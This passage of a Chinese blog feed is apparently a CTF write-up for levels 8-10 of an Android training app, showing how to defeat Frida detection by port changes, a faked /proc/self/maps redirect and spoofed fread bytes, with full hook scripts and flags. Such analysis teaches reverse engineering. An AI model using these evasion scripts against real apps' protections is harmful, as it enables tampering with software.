</span><br></code></pre></td></tr></table></figure><p>这里有一个网络字节转换的知识点（emmm计网的东西还没学），网络字节序是大端模式（Big-Endian），而主机字节序可能是小端模式（Little-Endian），关于这个大小端（死去的回忆突然开始攻击我），简单说一下</p><ul><li>大端字节序（Big Endian）：最高有效位存于最低内存地址处，最低有效位存于最高内存处</li><li>小端字节序（Little Endian）：最高有效位存于最高内存地址，最低有效位存于最低内存处</li></ul><p>所以我们可以根据信息得出端口</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xA2690002</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xA269</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x69A2</span>-&gt;</span><span class="hljs-number">27042</span><br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x8A5D</span>-&gt;</span><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5D8A</span>-&gt;</span><span class="hljs-number">23946</span><br></code></pre></td></tr></table></figure><p><code>23946</code> 端口是 IDA android_server 的默认端口，<code>27042</code> 是 Frida 默认端口</p><p><img src="https://img.dkdun.cn/v1/2025/12/8da71fcd02c31a16.png"></p><p>因此我们解决办法就是开启 frida 时把端口改了，不然会被检测到</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">./frida-server -l <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">9997</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d0d1117d0513d160.png"></p><p>然后我打开程序的时候老是跳出这个弹窗，烦死了</p><p><img src="https://img.dkdun.cn/v1/2025/12/92a8ced625aec488.png"></p><p>可以使用这个命令来关掉（菜鸡，还不知道有什么其他方法）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">adb shell am clear-debug-app<br></code></pre></td></tr></table></figure><p>写一个脚本 hook.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> targetAddress = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">var</span> input = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaa&quot;</span>)) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG: &quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error: &quot;</span> + e);<br>            &#125;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">hook</span>();<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span> = <span class="hljs-title class_">MainActivity</span>.$new();<br>        <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>    &#125;);<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><p>这里需要先把端口转发一下，把模拟器的 <code>9997</code> 端口转发到本地的 <code>9997</code>，因为通过 <code>adb forward</code> 把它的端口映射到了本地，hook 时需要写一个  <code>127.0.0.1:9997</code> （其实还可以用本机的 IP，但是有时候可能会比较麻烦，模拟器有时候无法直接通过 IP 访问设备上的一些服务）连接到这个端口</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">./frida-server <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9997</span><br>adb forward tcp:<span class="hljs-number">9997</span> tcp:<span class="hljs-number">9997</span><br>frida -H <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9997</span> -f com.swdd.summertrain -l hook.js<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/342d0198eba009a7.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;<span class="hljs-number">53</span>cd3f37664bd01357182ca13bc2f9b6&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida检测之Maps-level9"><a href="#Frida检测之Maps-level9" class="headerlink" title="Frida检测之Maps-level9"></a>Frida检测之Maps-level9</h1><p>Java 层没什么东西，同样是看 <code>Native</code> 层，这里有一个检测 <code>maps</code> 的。</p><p><code>/proc/self/maps</code> 是一个特殊的文件，它包含了当前进程的内存映射信息。当你打开这个文件时，它会显示一个列表，其中包含了进程中每个内存区域的详细信息。这些信息通常包括：</p><ul><li>起始地址（Start Address）</li><li>结束地址（End Address）</li><li>权限（如可读、可写、可执行）</li><li>共享&#x2F;私有标志（Shared or Private）</li><li>关联的文件或设备（如果内存区域是文件映射的）</li><li>内存区域的偏移量</li><li>内存区域的类型（如匿名映射、文件映射、设备映射等）</li></ul><p>当注入frida后，在maps文件中就会存在 <code>frida-agent-64.so</code>、<code>frida-agent-32.so</code> 等文件。</p><p>（上面这段专业术语 copy 的 52 的正己师傅的hhhhh）</p><p><img src="https://img.dkdun.cn/v1/2025/12/e46f7cc7608020b7.png"></p><p>这个函数流程就是打开 <code>proc/self/maps</code> ，然后检测是否有这些内存特征，如果有就直接终止程序</p><ul><li><code>frida</code>：检测 Frida 注入的 Agent 或 Server</li><li><code>gadget</code>&#x2F;<code>agent</code>：检测 Frida Gadget 或调试工具组件</li><li><code>/data/local/tmp/</code>：检测临时目录下的注入文件（如 Frida Server）</li><li><code>-64.so</code>&#x2F;<code>-32.so</code>：检测特定架构的动态库（如 Frida 的 64&#x2F;32 位库）</li></ul><p>hook 脚本，重定向一个 <code>maps</code> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 定义一个函数，用于重定向并修改maps文件内容，以隐藏特定的库和路径信息</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mapsRedirect</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 定义伪造的maps文件路径</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">FakeMaps</span> = <span class="hljs-string">&quot;/data/data/com.swdd.summertrain/maps&quot;</span>;<br>    <span class="hljs-comment">// 获取libc.so库中&#x27;open&#x27;函数的地址</span><br>    <span class="hljs-keyword">const</span> openPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&#x27;libc.so&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>);<br>    <span class="hljs-comment">// 根据地址创建一个新的NativeFunction对象，表示原生的&#x27;open&#x27;函数</span><br>    <span class="hljs-keyword">const</span> open = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(openPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <span class="hljs-comment">// 查找并获取libc.so库中&#x27;read&#x27;函数的地址</span><br>    <span class="hljs-keyword">var</span> readPtr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>);<br>    <span class="hljs-comment">// 创建新的NativeFunction对象表示原生的&#x27;read&#x27;函数</span><br>    <span class="hljs-keyword">var</span> read = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(readPtr, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&quot;int&quot;</span>]);<br>    <span class="hljs-comment">// 分配512字节的内存空间，用于临时存储从maps文件读取的内容</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsBuffer</span> = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>(<span class="hljs-number">512</span>);<br>    <span class="hljs-comment">// 创建一个伪造的maps文件，用于写入修改后的内容，模式为&quot;w&quot;（写入）</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MapsFile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-title class_">FakeMaps</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-comment">// 使用Interceptor替换原有的&#x27;open&#x27;函数，注入自定义逻辑</span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">replace</span>(openPtr, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeCallback</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">pathname, flag</span>) &#123;<br>        <span class="hljs-comment">// 调用原始的&#x27;open&#x27;函数，并获取文件描述符（FD）</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-variable constant_">FD</span> = <span class="hljs-title function_">open</span>(pathname, flag);<br>        <span class="hljs-comment">// 读取并打印尝试打开的文件路径</span><br>        <span class="hljs-keyword">var</span> ch = pathname.<span class="hljs-title function_">readCString</span>();<br>        <span class="hljs-keyword">if</span> (ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;/proc/&quot;</span>) &gt;= <span class="hljs-number">0</span> &amp;&amp; ch.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;maps&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;open : &quot;</span>, pathname.<span class="hljs-title function_">readCString</span>());<br>            <span class="hljs-comment">// 循环读取maps内容，并写入伪造的maps文件中，同时进行字符串替换以隐藏特定信息</span><br>            <span class="hljs-keyword">while</span> (<span class="hljs-built_in">parseInt</span>(<span class="hljs-title function_">read</span>(<span class="hljs-variable constant_">FD</span>, <span class="hljs-title class_">MapsBuffer</span>, <span class="hljs-number">512</span>)) !== <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">var</span> <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MapsBuffer</span>.<span class="hljs-title function_">readCString</span>();<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp/re.frida.server/frida-agent-64.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;re.frida.server&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;frida&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;agent&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;-32.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;-64.so&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;gadget&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>                <span class="hljs-title class_">MBuffer</span> = <span class="hljs-title class_">MBuffer</span>.<span class="hljs-title function_">replaceAll</span>(<span class="hljs-string">&quot;/data/local/tmp&quot;</span>, <span class="hljs-string">&quot;/1&quot;</span>);<br>                <span class="hljs-comment">// 将修改后的内容写入伪造的maps文件</span><br>                <span class="hljs-title class_">MapsFile</span>.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">MBuffer</span>);<br>            &#125;<br>            <span class="hljs-comment">// 为返回伪造maps文件的打开操作，分配UTF8编码的文件名字符串</span><br>            <span class="hljs-keyword">var</span> filename = <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">allocUtf8String</span>(<span class="hljs-title class_">FakeMaps</span>);<br>            <span class="hljs-comment">// 返回打开伪造maps文件的文件描述符</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">open</span>(filename, flag);<br>        &#125;<br>        <span class="hljs-comment">// 如果不是目标maps文件，则直接返回原open调用的结果</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">FD</span>;<br>    &#125;, <span class="hljs-string">&#x27;int&#x27;</span>, [<span class="hljs-string">&#x27;pointer&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">mapsRedirect</span>();<br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input =<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaa&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>+<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span>=<span class="hljs-title class_">MainActivity</span>.$new();<br>    <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br><br></code></pre></td></tr></table></figure><p>运行得出 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/5fe15c2bd9761773.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;f5d02d7eede3a75ee6e6cc0a9673c76f&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida-检测之-inlineHook-level10"><a href="#Frida-检测之-inlineHook-level10" class="headerlink" title="Frida 检测之 inlineHook-level10"></a><strong>Frida 检测之 inlineHook</strong>-level10</h1><p>看 <code>native</code>  层的 <code>check</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/49f0f9abdb1a4e9a.png"></p><p>读取磁盘中 <code>libc.so</code> 文件 <code>signal</code> 函数的原始 8 字节数，获取内存中 <code>signal</code> 函数的实际代码比较二者是否一致，如果不一致程序就会退出，所以我们要模拟 <code>fread</code> 读取了预期数据，伪造返回值</p><p>获取 hook 前面的 8 个字节</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> bytes_count = <span class="hljs-number">8</span><br><span class="hljs-keyword">let</span> address = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;signal&quot;</span>)<br><span class="hljs-comment">//读取 signal 函数</span><br><br><span class="hljs-keyword">let</span> before = <span class="hljs-title function_">ptr</span>(address)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot; before hook: &quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(before, &#123;<br>    <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">length</span>: bytes_count,<br>    <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>  &#125;));<br><br></code></pre></td></tr></table></figure><p>得出</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">e9 <span class="hljs-number">7</span>f f7 <span class="hljs-number">97</span> f4 <span class="hljs-number">83</span> e4 f0<br></code></pre></td></tr></table></figure><p>hook 脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_memcmp_addr</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//hook反调试</span><br>    <span class="hljs-keyword">var</span> memcmp_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fread&quot;</span>);<br>    <span class="hljs-keyword">if</span> (memcmp_addr !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;fread address: &quot;</span>, memcmp_addr);<br>        <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(memcmp_addr, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = args[<span class="hljs-number">0</span>];   <span class="hljs-comment">// 保存 buffer 参数</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = args[<span class="hljs-number">1</span>];     <span class="hljs-comment">// 保存 size 参数</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = args[<span class="hljs-number">2</span>];    <span class="hljs-comment">// 保存 count 参数</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">stream</span> = args[<span class="hljs-number">3</span>];   <span class="hljs-comment">// 保存 FILE* 参数</span><br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>            <span class="hljs-comment">// 这里可以修改 buffer 的内容，假设我们知道何时 fread 被用于敏感操作</span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>() == <span class="hljs-number">8</span>) &#123;<br>                <span class="hljs-comment">// 模拟 fread 读取了预期数据，伪造返回值</span><br>                <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>, [<span class="hljs-number">0xe9</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>]); <br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">// 填充前8字节</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>));<br>            &#125;<br>        &#125;<br>    &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error: memcmp function not found in libc.so&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">hook_memcmp_addr</span>();<br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input =<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>+<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br><br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span>=<span class="hljs-title class_">MainActivity</span>.$new();<br>    <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br><br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br><br></code></pre></td></tr></table></figure><p>得出 flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;a8490cd255d3a0a982fac16130183b76&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Android题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Silver Platter</title>
    <link href="/2025/01/31/Platter/"/>
    <url>/2025/01/31/Platter/</url>
    
